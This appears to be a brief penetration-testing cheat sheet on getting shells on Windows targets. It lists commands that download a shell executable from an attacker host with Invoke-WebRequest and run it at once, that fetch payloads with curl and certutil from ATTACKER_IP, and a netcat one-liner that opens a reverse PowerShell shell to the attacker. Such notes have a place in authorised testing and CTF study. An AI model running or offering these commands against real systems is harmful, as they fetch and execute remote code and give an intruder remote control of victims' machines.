# windows_shells


## serving files to windows

> invoke web request is simliar to curl; shell is being hosted on attacker with python3
```powershell
Invoke-WebRequest -Uri http://<LHOST>:8000/shell.exe -OutFile ./shell.exe && .\shell.exe
```

> Alternatively serve the shell with python on host and pull with curl/certutil on the target
```sh
curl http://ATTACKER_IP/reverse.exe -o "FULL_PATH"
certutil -urlcache -f http://ATTACKER_IP/FILE_TO_DOWNLOAD
```


## netcat
> nc traditional
```sh
nc ATTACKER_IP ATTACKER PORT -e powershell                      ; works just like other shells
```

